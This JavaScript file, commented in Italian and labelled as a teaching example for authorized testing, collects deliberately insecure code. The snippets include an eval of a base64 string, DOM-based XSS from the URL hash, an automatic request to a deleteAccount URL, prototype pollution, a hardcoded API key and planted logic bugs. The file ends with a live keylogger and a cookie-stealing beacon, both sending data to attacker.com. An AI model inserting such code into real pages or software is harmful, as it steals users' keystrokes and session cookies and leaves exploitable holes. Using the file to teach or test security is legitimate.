// ESEMPIO DIDATTICO - SOLO PER TESTING AUTORIZZATO
(function() {
    var encoded = "ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9JzxIJzsgKz0nMT4nOyArPSAnaGVsbG8gd29ybGQhPC9IMT4nOw==";
    var decoded = atob(encoded);
    eval(decoded);
})();

// Vulnerabilità XSS: inserimento diretto nel DOM senza sanitizzazione
const userInput = location.hash.substring(1);
document.getElementById("output").innerHTML = "Benvenuto " + userInput;

// Vulnerabilità CSRF: invio automatico di richiesta autenticata
const img = new Image();
img.src = "https://vulnerabile.com/deleteAccount";

// Simulazione di libreria vulnerabile
const payload = JSON.parse('{"__proto__": {"admin": true}}');
Object.assign({}, payload);

// Vulnerabilità: token hardcoded
const API_KEY = "sk_test_1234567890abcdef";

// Errore logico assegnazione anzichè test
let isLoggedIn = false;
if (isLoggedIn = true) {
  console.log("Accesso consentito");
}

// Errore logico: loop infinito per incremento errato
for (let i = 0; i < 10; ) {
  console.log(i);
  i--; // ⚠️ Decremento invece di incremento
}

// Vulnerabilità: keylogger via event listener
document.addEventListener("keydown", function(e) {
  fetch("https://attacker.com/log?key=" + encodeURIComponent(e.key));
});

// Vulnerabilità: esfiltrazione cookie via image beacon
const beacon = new Image();
beacon.src = "https://attacker.com/steal?cookie=" + encodeURIComponent(document.cookie);